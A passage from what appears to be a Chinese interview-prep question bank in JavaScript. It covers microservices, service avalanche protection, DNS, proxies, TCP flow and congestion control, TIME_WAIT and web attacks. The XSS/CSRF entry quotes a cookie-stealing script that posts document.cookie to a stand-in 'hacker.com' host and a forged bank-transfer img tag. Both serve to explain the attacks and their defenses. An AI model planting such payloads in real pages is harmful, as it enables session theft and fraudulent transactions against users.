        <li><strong>独立部署/扩展</strong>：每个服务可独立部署、独立扩缩容（按需）。</li>
        <li><strong>粒度适中</strong>：不要过度拆分（纳秒级微服务）——服务太多管理复杂、调用链长、运维成本高。也不要太粗（单体微服务）——失去拆分意义。原则：能独立部署、独立扩展、独立技术栈。</li>
        <li><strong>避免循环依赖</strong>：服务间依赖单向，有环要重构（或用事件解耦）。</li>
        <li><strong>团队自治</strong>：一个服务一个团队（康威定律），团队对服务全权负责。</li>
      </ul>
      <p><strong>3. DDD（领域驱动设计）指导</strong></p>
      <p>DDD 用<strong>限界上下文（Bounded Context）</strong>划分领域边界，一个限界上下文对应一个微服务。领域内有实体、值对象、聚合根。DDD 帮助找到合理的拆分边界。</p>
      <p><strong>4. 拆分时机</strong></p>
      <ul>
        <li>不要一开始就拆（YAGNI）。单体开发快，业务清晰后再拆。</li>
        <li>拆分时机：模块边界清晰、团队规模扩大、需要独立扩展某模块、部署冲突。</li>
        <li>"绞杀者模式"：逐步从单体抽取微服务，新旧并存。</li>
      </ul>
      <p><strong>5. 拆分的代价</strong></p>
      <ul>
        <li>分布式复杂性（网络、一致性、事务、调试难）。</li>
        <li>运维成本（部署、监控、链路追踪）。</li>
        <li>数据一致性（跨服务事务难）。</li>
      </ul>
      <p><strong>6. 面试标准答法</strong></p>
      <p>按业务能力/领域(DDD限界上下文)拆，单一职责高内聚低耦合，独立数据库不共享，独立部署扩展，粒度适中(不微不粗)，避免循环依赖。康威定律(一服务一团队)。不要一开始就拆，业务清晰后逐步拆(绞杀者模式)。代价：分布式复杂性。</p>`},
  {c:"分布式",d:"★★",q:"服务雪崩是什么？怎么防止？",
   a:`<p><strong>服务雪崩</strong>：在微服务调用链中，如果某个下游服务响应慢或挂了，上游服务的请求线程会被阻塞（一直等响应），导致上游资源耗尽也挂，连锁反应导致整个系统崩溃。</p>
      <p>防止措施（服务治理）：</p>
      <ul>
        <li><strong>熔断</strong>：下游故障率达到阈值时，快速失败，不再调用，防止级联崩溃。Sentinel/Hystrix。</li>
        <li><strong>降级</strong>：服务不可用时返回兜底数据（默认值、缓存），保证主流程。</li>
        <li><strong>限流</strong>：控制请求速率，保护系统不被压垮。</li>
        <li><strong>超时设置</strong>：调用一定要设超时，避免无限等待。</li>
        <li><strong>隔离</strong>：线程池/信号量隔离，不同服务互不影响。</li>
      </ul>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. 服务雪崩的过程</strong></p>
      <p>微服务调用链：A → B → C。如果 C 故障（慢或挂）：</p>
      <ol>
        <li>C 响应慢 → B 调 C 的请求<strong>阻塞</strong>（线程一直等，超时未设或很长）。</li>
        <li>B 的线程池被耗尽（都在等 C）→ B 也无法处理其他请求 → B "挂了"。</li>
        <li>A 调 B 阻塞 → A 线程耗尽 → A 挂。</li>
        <li>连锁反应，整个系统<strong>雪崩</strong>。</li>
      </ol>
      <p>核心原因：<strong>同步阻塞 + 资源耗尽 + 无保护</strong>。</p>
      <p><strong>2. 防止措施（服务容错）</strong></p>
      <ul>
        <li><strong>超时（Timeout）</strong>：调用一定要设超时（连接超时、读超时），避免无限等待。这是<strong>最基本的</strong>。超时后快速失败而非阻塞。</li>
        <li><strong>熔断（Circuit Breaker）</strong>：当下游的失败率/慢调用比例超过阈值，<strong>熔断器打开</strong>，一段时间内直接快速失败，不再调用下游。给下游恢复时间，防止级联崩溃。一段时间后进入<strong>半开</strong>试探（放少量请求），成功则关闭熔断恢复。Sentinel、Hystrix、Resilience4j 实现。</li>
        <li><strong>降级（Fallback）</strong>：服务不可用（熔断/异常）时返回<strong>兜底数据</strong>（默认值、缓存、友好提示），保证主流程或核心功能。如商品评价不可用返回"暂无评价"。</li>
        <li><strong>限流（Rate Limiting）</strong>：控制请求速率（令牌桶/漏桶），保护系统不被突发流量压垮。入口限流。</li>
        <li><strong>隔离（Bulkhead/Isolation）</strong>：
          <ul>
            <li><strong>线程池隔离</strong>：不同服务用不同线程池，互不影响（A 服务的线程池满不影响 B）。</li>
            <li><strong>信号量隔离</strong>：用信号量限制并发（轻量，无队列）。</li>
          </ul>
        </li>
        <li><strong>缓存</strong>：下游数据缓存，下游挂了用缓存兜底。</li>
        <li><strong>异步</strong>：非核心调用异步化（MQ），不阻塞主流程。</li>
      </ul>
      <p><strong>3. 熔断器的三种状态</strong></p>
      <ul>
        <li><strong>Closed（关闭）</strong>：正常调用。统计失败率。</li>
        <li><strong>Open（打开）</strong>：失败率达阈值，熔断，快速失败。</li>
        <li><strong>Half-Open（半开）</strong>：休眠期后，放少量请求试探，成功则关闭，失败则继续打开。</li>
      </ul>
      <p><strong>4. 主流框架</strong></p>
      <ul>
        <li><strong>Sentinel（阿里，Spring Cloud Alibaba）</strong>：限流+熔断+降级+系统保护，主流。</li>
        <li><strong>Hystrix（Netflix，停更）</strong>：熔断+降级+隔离。</li>
        <li><strong>Resilience4j</strong>：Hystrix 替代，函数式。</li>
      </ul>
      <p><strong>5. 面试标准答法</strong></p>
      <p>雪崩：下游故障→上游线程阻塞耗尽→连锁崩溃。原因：同步阻塞+无保护。防止：①超时(基本)；②熔断(失败率达阈值快速失败，三状态Closed/Open/Half-Open)；③降级(兜底数据)；④限流(控制速率)；⑤隔离(线程池/信号量)。Sentinel主流。</p>`},

  // ============ 网络 补充 ============
  {c:"网络",d:"★★★",q:"DNS 解析的原理是怎样的？",
   a:`<p>输入域名后，DNS 把域名解析成 IP 的过程：</p>
      <ol>
        <li>先查<strong>浏览器 DNS 缓存</strong>，再查<strong>操作系统缓存</strong>（hosts 文件）。</li>
        <li>没有就问<strong>本地 DNS 服务器</strong>（配置的，比如 8.8.8.8 或运营商的）。</li>
        <li>本地 DNS 没有就<strong>递归查询</strong>：问<strong>根域名服务器</strong>（.）→ 告诉你顶级域名服务器（.com）的地址 → 再问顶级域名服务器 → 告诉你权威域名服务器的地址 → 最后问权威服务器拿到最终 IP。</li>
        <li>结果逐层返回并缓存（按 TTL）。</li>
      </ol>
      <blockquote>本地 DNS 到根的过程叫<strong>迭代查询</strong>（每次返回下一步该问谁），客户端到本地 DNS 叫<strong>递归查询</strong>（客户端只问一次，等结果）。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. DNS 是什么</strong></p>
      <p>Domain Name System，域名系统。把人类易记的域名（www.baidu.com）解析成机器用的 IP（39.156.66.14）。是互联网的"电话簿"。</p>
      <p><strong>2. DNS 解析的层级</strong></p>
      <ul>
        <li><strong>根域名服务器（.）</strong>：最高层，管理顶级域名。全球13组（A-M）。</li>
        <li><strong>顶级域名服务器（TLD）</strong>：如 .com、.cn、.org。</li>
        <li><strong>权威域名服务器</strong>：具体域名的权威解析（如 baidu.com 的解析）。域名注册商/Cloudflare 管理。</li>
        <li><strong>本地 DNS（递归解析器）</strong>：用户配置的 DNS（如 8.8.8.8、运营商的 114.114.114.114），帮用户跑腿查询。</li>
      </ul>
      <p><strong>3. 解析流程</strong></p>
      <ol>
        <li><strong>浏览器 DNS 缓存</strong> → <strong>OS 缓存（hosts）</strong>：先查本地缓存。</li>
        <li><strong>本地 DNS 服务器</strong>（递归解析器）：OS 配置的 DNS，查它的缓存。</li>
        <li>本地 DNS 没缓存，进行<strong>迭代查询</strong>：
          <ul>
            <li>问<strong>根服务器</strong>：".com 的 TLD 服务器在哪？"→ 返回 .com TLD 地址。</li>
            <li>问<strong>.com TLD</strong>："baidu.com 的权威服务器在哪？"→ 返回权威服务器地址。</li>
            <li>问<strong>权威服务器</strong>："www.baidu.com 的 IP？"→ 返回最终 IP。</li>
          </ul>
        </li>
        <li>本地 DNS 把 IP 返回客户端，并<strong>缓存（按 TTL）</strong>。</li>
      </ol>
      <p><strong>4. 递归查询 vs 迭代查询</strong></p>
      <ul>
        <li><strong>递归</strong>：客户端 → 本地 DNS。客户端只问一次，本地 DNS 负责跑完整个流程返回结果。</li>
        <li><strong>迭代</strong>：本地 DNS → 各级服务器。每级返回"下一步问谁"，本地 DNS 自己接着问。</li>
      </ul>
      <p><strong>5. 记录类型</strong></p>
      <ul>
        <li><strong>A</strong>：域名→IPv4。AAAA：域名→IPv6。</li>
        <li><strong>CNAME</strong>：别名（域名→另一个域名）。</li>
        <li><strong>MX</strong>：邮件服务器。</li>
        <li><strong>NS</strong>：该域的 DNS 服务器。</li>
        <li><strong>TXT</strong>：文本记录（如验证、SPF）。</li>
      </ul>
      <p><strong>6. 面试标准答法</strong></p>
      <p>DNS域名→IP。流程：浏览器/OS缓存→本地DNS→迭代查(根→TLD→权威)拿IP→缓存。客户端到本地DNS是递归(只问一次)，本地DNS到各级是迭代(返回下一步)。记录类型A/AAAA/CNAME/MX。按TTL缓存。</p>`},
  {c:"网络",d:"★★",q:"正向代理和反向代理的区别？",
   a:`<table><tr><th></th><th>正向代理</th><th>反向代理</th></tr>
      <tr><td>代理谁</td><td>代理<strong>客户端</strong></td><td>代理<strong>服务端</strong></td></tr>
      <tr><td>客户端知道</td><td>真实服务器地址</td><td>只知代理地址，不知真实服务器</td></tr>
      <tr><td>典型场景</td><td>翻墙、公司上网管控、隐藏客户端</td><td>Nginx 负载均衡、CDN、隐藏服务端</td></tr></table>
      <blockquote>记忆：正向代理帮客户端访问（客户端配置），反向代理帮服务端接收（服务端配置）。Nginx 是最常用的反向代理。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. 正向代理（Forward Proxy）</strong></p>
      <ul>
        <li><strong>代理客户端</strong>：客户端配置代理，请求先到代理，代理转发到真实服务器。</li>
        <li>服务器<strong>看到的是代理 IP</strong>（客户端真实 IP 被隐藏）。</li>
        <li>客户端<strong>知道真实服务器</strong>（自己配的代理目标）。</li>
        <li><strong>场景</strong>：翻墙（VPN/代理访问被墙网站）、公司上网管控、爬虫隐藏 IP、负载测试。</li>
        <li>例子：Shadowsocks、Squid、HTTP 代理。</li>
      </ul>
      <p><strong>2. 反向代理（Reverse Proxy）</strong></p>
      <ul>
        <li><strong>代理服务端</strong>：客户端请求到代理，代理转发给后端真实服务器。客户端<strong>不知道真实服务器</strong>（以为代理就是服务器）。</li>
        <li>客户端访问的是<strong>代理地址</strong>。</li>
        <li><strong>场景</strong>：负载均衡（Nginx 分发到多台后端）、CDN（就近节点）、隐藏后端（安全）、SSL 卸载（HTTPS 在代理层解密）、缓存、网关。</li>
        <li>例子：Nginx、HAProxy、F5（硬件）、Cloudflare。</li>
      </ul>
      <p><strong>3. 核心区别</strong></p>
      <ul>
        <li><strong>代理对象</strong>：正向代理客户端，反向代理服务端。</li>
        <li><strong>谁配置</strong>：正向代理客户端配，反向代理服务端配。</li>
        <li><strong>透明性</strong>：正向代理服务器看不到客户端真身，反向代理客户端看不到服务端真身。</li>
        <li><strong>用途</strong>：正向=突破访问限制/隐藏客户端；反向=负载均衡/安全/缓存/隐藏后端。</li>
      </ul>
      <p><strong>4. 面试标准答法</strong></p>
      <p>正向代理代理客户端(客户端配，隐藏客户端IP，翻墙/管控)。反向代理代理服务端(服务端配，隐藏后端，负载均衡/CDN/SSL卸载)。Nginx是最常用反向代理。区别：代理对象、谁配置、透明性。</p>`},
  {c:"网络",d:"★★★",q:"TCP 的滑动窗口是什么？",
   a:`<p>滑动窗口是 TCP <strong>流量控制</strong>的机制。发送方不用等一个包确认了再发下一个，可以<strong>连续发多个包</strong>（窗口内的），提高效率。</p>
      <p>原理：接收方在 ACK 里告诉发送方"我还能接收多少数据"（窗口大小 rwnd）。发送方根据这个调整发送速度，窗口随确认包到达而向前"滑动"。</p>
      <p>好处：</p>
      <ul>
        <li><strong>提升吞吐</strong>：不用一问一答，可以批量发。</li>
        <li><strong>流量控制</strong>：接收方处理不过来时，把窗口设小，防止被压垮。</li>
      </ul>
      <blockquote>窗口大小为 0 时，发送方暂停发送，定期发窗口探测包看能不能继续。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. 为什么需要滑动窗口</strong></p>
      <p>停等协议（发一个等确认再发下一个）效率极低（一个 RTT 一个包）。滑动窗口允许发送方<strong>连续发多个包</strong>（不用每个都等确认），大幅提升吞吐。</p>
      <p><strong>2. 滑动窗口的原理</strong></p>
      <ul>
        <li>发送方维护一个<strong>发送窗口</strong>，窗口内的包可以连续发送（不必等确认）。</li>
        <li>窗口大小由<strong>接收方通告（rwnd，接收窗口）</strong>：接收方在 ACK 里告诉发送方"我缓冲区还能收多少"。这是<strong>流量控制</strong>。</li>
        <li>收到确认后，窗口<strong>向右滑动</strong>（已确认的出去，新的可发进来）。</li>
      </ul>
      <p><strong>3. 发送窗口的四个部分</strong></p>
      <ul>
        <li>① 已发送已确认（窗口左侧之外）。</li>
        <li>② 已发送未确认（窗口内左部）。</li>
        <li>③ 可发送未发送（窗口内右部，可立即发）。</li>
        <li>④ 不可发送（窗口右侧之外，等窗口滑动）。</li>
      </ul>
      <p>确认一个，窗口右移一个，新的进入"可发送"。</p>
      <p><strong>4. 流量控制</strong></p>
      <p>接收方处理不过来（缓冲区满），通告<strong>窗口变小甚至 0</strong>（零窗口）。发送方暂停发送。窗口为0时，发送方定期发<strong>窗口探测</strong>（Zero Window Probe）看接收方能否接收。接收方处理完通告新窗口恢复。</p>
      <p><strong>5. 糊涂窗口综合征（Silly Window Syndrome）</strong></p>
      <p>接收方每次只通告很小的窗口（如1字节），发送方发很小的包，效率极低。解决：Clark 算法（接收方缓冲区不足一定量不通告窗口）、Nagle 算法（发送方攒够一定量再发）。</p>
      <p><strong>6. 滑动窗口 vs 拥塞控制</strong></p>
      <p>滑动窗口是<strong>流量控制</strong>（接收方怕自己被压垮，靠 rwnd）。拥塞控制是<strong>网络保护</strong>（怕网络拥塞，靠 cwnd）。发送窗口 = min(rwnd, cwnd)。</p>
      <p><strong>7. 面试标准答法</strong></p>
      <p>滑动窗口是TCP流量控制机制。发送方在窗口内连续发多个包(不等每个确认)，接收方通告rwnd控制窗口大小(处理不过来窗口变小甚至0)。确认后窗口右滑。提升吞吐+流量控制。发送窗口=min(rwnd接收窗口, cwnd拥塞窗口)。</p>`},
  {c:"网络",d:"★★★",q:"TCP 的拥塞控制是怎样的？",
   a:`<p>拥塞控制是为了<strong>防止网络拥塞</strong>（路由器塞满丢包），通过控制发送方发送速度。四个算法：</p>
      <ol>
        <li><strong>慢启动</strong>：刚连接时，拥塞窗口 cwnd 从 1 开始，每收到一个 ACK 翻倍（指数增长），增长很快但叫"慢启动"。</li>
        <li><strong>拥塞避免</strong>：cwnd 到达阈值 ssthresh 后，改成线性增长（每个 RTT 加 1），慢慢试探。</li>
        <li><strong>快重传</strong>：收到 3 个重复 ACK，立即重传丢失的包，不等超时。</li>
        <li><strong>快恢复</strong>：快重传后，ssthresh 减半，cwnd 设为 ssthresh，进入拥塞避免（不回到慢启动）。</li>
      </ol>
      <blockquote>区分：流量控制（滑动窗口）是<strong>接收方</strong>怕自己被压垮；拥塞控制是<strong>网络</strong>怕被压垮。两者共同决定发送速度（取较小值）。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. 拥塞控制的目的</strong></p>
      <p>防止发送方发送过快导致<strong>网络拥塞</strong>（路由器/链路过载丢包）。通过动态调整<strong>拥塞窗口 cwnd</strong>（发送方能发的数据量）控制发送速度。</p>
      <p>注意区别<strong>流量控制</strong>（滑动窗口，接收方通告 rwnd，保护接收方）。发送窗口 = min(rwnd, cwnd)。</p>
      <p><strong>2. 四个算法</strong></p>
      <p><strong>① 慢启动（Slow Start）</strong></p>
      <ul>
        <li>连接刚建立时，cwnd=1（MSS）。</li>
        <li>每收到一个 ACK，cwnd+1，即<strong>每个 RTT 翻倍</strong>（指数增长：1→2→4→8...）。</li>
        <li>增长很快（虽然叫"慢启动"，因为起点是1）。</li>
        <li>到 ssthresh（慢启动阈值）后，转为拥塞避免。</li>
      </ul>
      <p><strong>② 拥塞避免（Congestion Avoidance）</strong></p>
      <ul>
        <li>cwnd ≥ ssthresh 后，改为<strong>线性增长</strong>（每个 RTT cwnd+1）。</li>
        <li>慢慢试探，避免冲爆网络。</li>
      </ul>
      <p><strong>③ 快重传（Fast Retransmit）</strong></p>
      <ul>
        <li>不等超时，收到<strong>3 个重复 ACK</strong>就认为包丢了，立即重传丢失的包。</li>
        <li>比超时重传快（超时等待长）。</li>
      </ul>
      <p><strong>④ 快恢复（Fast Recovery）</strong></p>
      <ul>
        <li>快重传后：ssthresh = cwnd/2，cwnd = ssthresh（不是回到1），进入拥塞避免。</li>
        <li>不回到慢启动（因为收到重复 ACK 说明网络还能传，不是完全拥塞）。</li>
      </ul>
      <p><strong>3. 超时的情况</strong></p>
      <p>如果发生<strong>超时</strong>（RTO，比快重传严重，说明网络很堵）：ssthresh = cwnd/2，<strong>cwnd 回到 1</strong>，重新慢启动。比快恢复更激进地降速。</p>
      <p><strong>4. 演进</strong></p>
      <ul>
        <li>Reno：经典四算法。</li>
        <li>New Reno、Cubic（Linux 默认）、BBR（Google，基于带宽探测而非丢包，更高效）。</li>
      </ul>
      <p><strong>5. 面试标准答法</strong></p>
      <p>拥塞控制防网络拥塞，调cwnd。四算法：慢启动(cwnd指数增长到ssthresh)→拥塞避免(线性增长)→快重传(3重复ACK立即重传)→快恢复(ssthresh减半cwnd=ssthresh不回1)。超时则cwnd回1。区别流量控制(滑动窗口保护接收方)。发送窗口=min(rwnd,cwnd)。</p>`},
  {c:"网络",d:"★★",q:"HTTP 长连接和短连接有什么区别？",
   a:`<ul>
        <li><strong>短连接</strong>：每次请求都新建 TCP 连接（三次握手），请求完就断开（四次挥手）。早期 HTTP/1.0 默认短连接，开销大。</li>
        <li><strong>长连接（Keep-Alive）</strong>：HTTP/1.1 默认。一个 TCP 连接可以发多个请求，一段时间没活动才断开。省去了反复握手的开销。</li>
      </ul>
      <p>注意：HTTP/1.1 长连接里，多个请求还是要<strong>排队</strong>（队头阻塞），HTTP/2 的多路复用才真正并发。</p>
      <blockquote>TCP 本身也有 KeepAlive 保活机制（探测连接是否还在），和 HTTP 的 Keep-Alive 不是一回事，别混淆。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. 短连接（HTTP/1.0 默认）</strong></p>
      <ul>
        <li>每次请求：建 TCP 连接（三次握手）→ 发请求/响应 → 断开（四次挥手）。</li>
        <li>缺点：每次握手挥手的开销大（2 个 RTT），并发请求多时连接数爆炸。</li>
      </ul>
      <p><strong>2. 长连接（HTTP/1.1 默认 Keep-Alive）</strong></p>
      <ul>
        <li>一个 TCP 连接<strong>保持打开</strong>，可发多个请求/响应（串行），一段时间空闲才断开（keep-alive timeout）。</li>
        <li>省去反复握手挥手的开销，性能提升明显。</li>
        <li>Connection: keep-alive（1.1 默认）/ close（主动关闭）。</li>
      </ul>
      <p><strong>3. 长连接的限制（HTTP/1.1）</strong></p>
      <ul>
        <li>同一连接上的请求<strong>串行</strong>处理（请求1响应后才发请求2），有<strong>队头阻塞</strong>。</li>
        <li>浏览器一般对同一域名开 6 个连接并行请求（绕过串行）。</li>
        <li>HTTP/2 多路复用才在一个连接上<strong>真正并发</strong>。</li>
      </ul>
      <p><strong>4. HTTP Keep-Alive vs TCP KeepAlive（易混淆）</strong></p>
      <ul>
        <li><strong>HTTP Keep-Alive</strong>：应用层，复用 TCP 连接发多个 HTTP 请求。</li>
        <li><strong>TCP KeepAlive</strong>：传输层（SO_KEEPALIVE），定时探测连接是否还活着（防僵死连接，如对端断电没发 FIN）。默认 2 小时探测一次。两者<strong>不是一回事</strong>。</li>
      </ul>
      <p><strong>5. 适用场景</strong></p>
      <ul>
        <li>长连接：Web 应用、API、数据库连接池（频繁请求）。</li>
        <li>短连接：少量一次性请求（如简单查询）。</li>
      </ul>
      <p><strong>6. 面试标准答法</strong></p>
      <p>短连接每次请求建/断TCP(开销大，1.0默认)。长连接(Keep-Alive，1.1默认)一个连接发多个请求(省握手)。1.1长连接仍串行(队头阻塞)，2.0多路复用并发。注意区分HTTP Keep-Alive(应用层复用)和TCP KeepAlive(传输层探活)。</p>`},
  {c:"网络",d:"★★",q:"TCP 粘包和拆包是什么？怎么解决？",
   a:`<p>TCP 是<strong>字节流</strong>协议，没有消息边界，发送的多个包可能粘成一个（粘包），或一个大包被拆成几个（拆包）。</p>
      <p>解决思路（在应用层定义消息边界）：</p>
      <ul>
        <li><strong>固定长度</strong>：每条消息固定字节数，不够补齐。简单但浪费。</li>
        <li><strong>分隔符</strong>：用特殊字符（如 \\n）分隔。要处理转义。</li>
        <li><strong>消息头长度字段</strong>（最常用）：消息头里存 body 的长度，接收方按长度读。Netty、Dubbo 都用这种。</li>
      </ul>
      <blockquote>本质：TCP 不维护应用层消息边界，所以需要应用层自己定义。UDP 是数据报，不会粘包。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. 粘包和拆包的现象</strong></p>
      <p>TCP 是<strong>字节流</strong>（无边界），应用层连续发送多条消息时：</p>
      <ul>
        <li><strong>粘包</strong>：多条消息粘在一起。如发 "ABC"+"DEF"，接收方可能一次收到 "ABCDEF"（分不清是两条还是一条）。</li>
        <li><strong>拆包（半包）</strong>：一条消息被拆成多次接收。如发 "ABCDEFG"，接收方第一次收到 "ABC"，第二次收到 "DEFG"。</li>
      </ul>
      <p>原因：TCP 只保证字节流的顺序和可靠，不维护应用层消息边界；发送方有发送缓冲区（攒够再发），接收方有接收缓冲区（按自己的节奏读）。Nagle 算法、缓冲区大小、MSS 都会导致。</p>
      <p><strong>2. 严格说"粘包"是伪命题</strong></p>
      <p>TCP 本来就是流协议，"包"是应用层概念。TCP 没有"包"只有"字节流"。粘包拆包是<strong>应用层消息边界</strong>的问题，不是 TCP 的 bug。</p>
      <p><strong>3. 解决方案（应用层定义消息边界）</strong></p>
      <ul>
        <li><strong>固定长度</strong>：每条消息固定 N 字节，不够补齐。接收方按 N 读。简单但浪费空间。</li>
        <li><strong>分隔符</strong>：消息用特殊字符（如 \\n、\\r\\n）分隔。HTTP 的 header 用 \\r\\n。缺点：消息内不能含分隔符（或要转义）。</li>
        <li><strong>消息头 + 长度字段（最常用）</strong>：消息分头和体，头里有表示体长度的字段（如 magic+length+body）。接收方先读头拿长度，再按长度读体。Netty 的 LengthFieldBasedFrameDecoder、Dubbo 协议、自定义 RPC 都用这种。</li>
      </ul>
      <p><strong>4. Netty 的解码器</strong></p>
      <ul>
        <li>FixedLengthFrameDecoder：固定长度。</li>
        <li>DelimiterBasedFrameDecoder：分隔符。</li>
        <li>LengthFieldBasedFrameDecoder：长度字段（最通用）。</li>
        <li>LineBasedFrameDecoder：行分隔（\\n）。</li>
      </ul>
      <p><strong>5. UDP 不会有粘包拆包</strong></p>
      <p>UDP 是<strong>数据报</strong>（有边界），一次 send 对应一次 recv，边界清晰。</p>
      <p><strong>6. 面试标准答法</strong></p>
      <p>TCP是字节流无边界，多消息可能粘一起(粘包)或一条拆多次(拆包)。本质是应用层消息边界问题。解决：固定长度、分隔符(\\n)、消息头+长度字段(最常用，Netty/Dubbo)。UDP是数据报有边界不会有此问题。</p>`},
  {c:"网络",d:"★★",q:"TIME_WAIT 状态过多有什么问题？怎么解决？",
   a:`<p>主动关闭连接的一方，发完最后一个 ACK 后进入 TIME_WAIT，要等 2MSL（最大报文生存时间，约 60-120 秒）才真正关闭。高并发服务器会有大量 TIME_WAIT。</p>
      <p><strong>问题</strong>：每个连接占一个端口，过多会耗尽端口，导致无法新建连接。</p>
      <p><strong>为什么有 TIME_WAIT</strong>：① 保证最后 ACK 能到达（丢了对方会重发 FIN）；② 让旧连接的报文消失，不影响新连接。</p>
      <p><strong>解决</strong>：</p>
      <ul>
        <li>调小 <code>tcp_max_tw_buckets</code>。</li>
        <li>开启 <code>tcp_tw_reuse</code>（允许复用 TIME_WAIT 连接）。</li>
        <li>用长连接减少连接创建。</li>
      </ul>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. TIME_WAIT 回顾</strong></p>
      <p>主动关闭方四次挥手发完最后 ACK 后进入 TIME_WAIT，等 <strong>2MSL</strong>（Maximum Segment Lifetime，报文最大生存时间，Linux 默认 60s，即 2×30s）才真正 CLOSED。详见 TCP 握手挥手题。</p>
      <p><strong>2. 为什么服务器（作为客户端调用方）会有大量 TIME_WAIT</strong></p>
      <ul>
        <li>服务器作为<strong>客户端</strong>去调下游（如调 DB、RPC、第三方 API），这些<strong>短连接</strong>由服务器主动关闭 → 服务器产生 TIME_WAIT。</li>
        <li>LVS/反向代理转发后主动关闭 → 大量 TIME_WAIT。</li>
        <li>高并发短连接（如每秒上万新建+关闭）。</li>
      </ul>
      <p><strong>3. TIME_WAIT 过多的问题</strong></p>
      <ul>
        <li><strong>占用端口</strong>：每个连接占一个本地端口（客户端视角的 4 元组）。端口范围 32768-60999（约2.8万），TIME_WAIT 持续 60s，高并发下可能<strong>耗尽端口</strong>，导致无法新建连接（Cannot assign requested address）。</li>
        <li><strong>占用内存</strong>：每个连接占少量内核内存（sock 结构），几十万 TIME_WAIT 占几百 MB。</li>
        <li>总体不严重（内核能处理大量 TIME_WAIT），但端口耗尽是大问题。</li>
      </ul>
      <p><strong>4. 解决方案</strong></p>
      <ul>
        <li><strong>用长连接/连接池</strong>（根治）：减少短连接的创建关闭。如 RPC、DB 用连接池复用。</li>
        <li><strong>tcp_tw_reuse = 1</strong>：允许新连接复用 TIME_WAIT 的端口（针对<strong>客户端</strong>，作为客户端调下游时）。需要 tcp_timestamps 开启。安全（等 1 秒后可复用）。</li>
        <li><strong>tcp_tw_recycle = 1</strong>（已废弃，4.12 移除）：快速回收 TIME_WAIT。在 NAT 环境下会丢包（时间戳混乱），<strong>不要用</strong>。</li>
        <li><strong>tcp_max_tw_buckets</strong>：限制 TIME_WAIT 数量上限（超出直接删除）。治标。</li>
        <li><strong>增大端口范围</strong>：net.ipv4.ip_local_port_range = 1024 65535。</li>
        <li><strong>调小 MSL</strong>（不推荐，可能带来问题）。</li>
        <li><strong>让下游主动关闭</strong>（不太可控）。</li>
      </ul>
      <p><strong>5. 推荐做法</strong></p>
      <p>长连接/连接池（根治）+ tcp_tw_reuse（缓解）+ 合理端口范围。不要用 tcp_tw_recycle（NAT 丢包）。</p>
      <p><strong>6. 面试标准答法</strong></p>
      <p>TIME_WAIT等2MSL(60s)。过多问题：耗尽端口(Cannot assign requested address)、占内存。原因：服务器主动关短连接(调下游)。解决：长连接/连接池(根治)、tcp_tw_reuse(复用端口)、增大端口范围。不要用tcp_tw_recycle(NAT丢包，已废弃)。</p>`},
  {c:"网络",d:"★★",q:"CSRF 攻击和 XSS 攻击是什么？怎么防御？",
   a:`<ul>
        <li><strong>XSS（跨站脚本攻击）</strong>：攻击者往网页里注入恶意 JS，用户访问时执行。比如评论区存 <code>&lt;script&gt;</code>。<br>
        防御：输出时转义（把 &lt; &gt; 转成 &amp;lt;）、设置 CSP、HttpOnly cookie。</li>
        <li><strong>CSRF（跨站请求伪造）</strong>：利用用户的登录态，诱导用户在第三方网站发请求（用户不知情）。比如在钓鱼网站点按钮，实际向银行转账。<br>
        防御：Referer 校验、CSRF Token、SameSite cookie 属性。</li>
      </ul>
      <blockquote>区别：XSS 是往页面注入脚本（拿用户权限），CSRF 是借用用户身份发请求。两者常一起考。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. XSS（Cross-Site Scripting，跨站脚本）</strong></p>
      <p>攻击者在网页中<strong>注入恶意 JS</strong>，受害者浏览器执行，窃取 Cookie/Session、篡改页面、键盘记录、挂马。</p>
      <ul>
        <li><strong>类型</strong>：① 反射型（URL 参数注入，用户点恶意链接）；② 存储型（恶意脚本存到 DB 如评论区，所有访问者中招，危害大）；③ DOM 型（前端 JS 操作 DOM 注入）。</li>
        <li><strong>例子</strong>：评论区存 <code>&lt;script&gt;fetch('hacker.com?c='+document.cookie)&lt;/script&gt;</code>，别人看评论时 Cookie 被偷。</li>
        <li><strong>防御</strong>：
          <ul>
            <li><strong>输出转义/过滤</strong>：渲染用户输入时转义 HTML（&lt;→&amp;lt;），防止 &lt;script&gt; 执行。用模板引擎的自动转义（Thymeleaf/React 默认转义）。</li>
            <li><strong>CSP（Content Security Policy）</strong>：HTTP 头限制可加载脚本的来源（只允许同源/白名单），防注入脚本执行。</li>
            <li><strong>HttpOnly Cookie</strong>：Cookie 设 HttpOnly，JS 读不到，即使 XSS 也偷不到 Cookie。</li>
            <li>输入校验（长度、格式），但不要只靠它。</li>
          </ul>
        </li>
      </ul>
      <p><strong>2. CSRF（Cross-Site Request Forgery，跨站请求伪造）</strong></p>
      <p>利用<strong>用户的登录态（Cookie）</strong>，诱导用户在第三方网站发请求，以用户身份执行操作（转账、改密码）。用户<strong>不知情</strong>。</p>
      <ul>
        <li><strong>原理</strong>：用户登录银行（Cookie 存着）。用户访问钓鱼网站，钓鱼网站有个 <code>&lt;img src="bank.com/transfer?to=hacker&amp;amount=1000"&gt;</code>，浏览器带 Cookie 请求银行，银行以为是用户操作。</li>
        <li><strong>条件</strong>：基于 Cookie 认证 + 用户已登录 + 用户访问恶意页面。</li>
        <li><strong>防御</strong>：
          <ul>
            <li><strong>CSRF Token</strong>：服务端给表单一个随机 token，提交时校验。第三方网站拿不到这个 token。最有效。</li>
            <li><strong>Referer 校验</strong>：检查请求来源 Referer 是否是本站（Referer 可伪造但难）。</li>
            <li><strong>SameSite Cookie</strong>：Cookie 设 SameSite=Lax/Strict，跨站请求不带 Cookie。现代浏览器默认 Lax。</li>
            <li><strong>关键操作二次确认</strong>：转账等敏感操作要密码/验证码。</li>
          </ul>
        </li>
      </ul>
      <p><strong>3. XSS vs CSRF</strong></p>
      <ul>
        <li><strong>XSS</strong>：往页面<strong>注入脚本</strong>，窃取用户信息（Cookie）。攻击用户浏览器。</li>
